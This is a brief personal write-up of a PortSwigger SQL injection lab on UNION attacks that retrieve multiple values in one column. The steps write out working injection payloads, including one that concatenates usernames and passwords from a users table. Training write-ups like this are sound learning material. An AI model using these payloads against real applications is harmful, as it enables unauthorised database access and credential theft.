# SQL Injection - Retrieving multiple values in a single column

## 📌 Lab Details
- **Title**: Using UNION attack for retrieving multiple values in a single column.
- **Difficulty**: Practitoner
- **Category**: SQL Injection
- **Lab URL**: https://portswigger.net/academy/labs/launch/7c96fa50c7c53c9f9c96467a8b9e76f070dafcf9bfdcc4f04fc786ef0b0819d2?referrer=%2fweb-security%2fsql-injection%2funion-attacks%2flab-retrieve-multiple-values-in-single-column

## 🔍 Summary
This lab demonstarted how SQL can be used to retrieve multiple values in a single column.

## 🛠 Steps to Solve
1. Injecting `'+UNION+SELECT+NULL,'abc'--` to determine the number of columns, and which column contains text.
2. Injecting `'+UNION+SELECT+NULL,+version()--` to determine that `PostgreSQL` is being used.
3. Injecting `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--` to retrieve the contents of the `users` table.
   
## 📖 Key Takeaways
- Using `version()` to determine which database is being used.
- Using `'foo'||'bar'` to concatenate two strings.
  
## 🖼️ Screenshot 
![image](https://github.com/user-attachments/assets/2c226c21-fab8-47bf-8a82-b6a4f2cc8ae6)
![image](https://github.com/user-attachments/assets/d65d8a9e-7dfd-4d91-bd4a-3bb939c33e58)
![image](https://github.com/user-attachments/assets/f8b10694-9845-4c23-811a-97fe018546c7)
![image](https://github.com/user-attachments/assets/5a0418f2-bd8a-4d52-be9d-24d91abcecee)
